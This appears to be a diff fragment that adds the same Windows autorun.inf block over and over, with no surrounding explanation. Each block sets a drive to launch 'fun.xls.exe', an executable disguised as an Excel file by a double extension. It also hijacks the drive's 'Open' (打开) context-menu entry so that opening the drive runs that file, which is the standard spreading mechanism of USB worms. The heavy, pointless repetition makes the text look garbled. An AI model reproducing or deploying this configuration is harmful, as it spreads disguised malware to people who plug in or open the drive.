+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
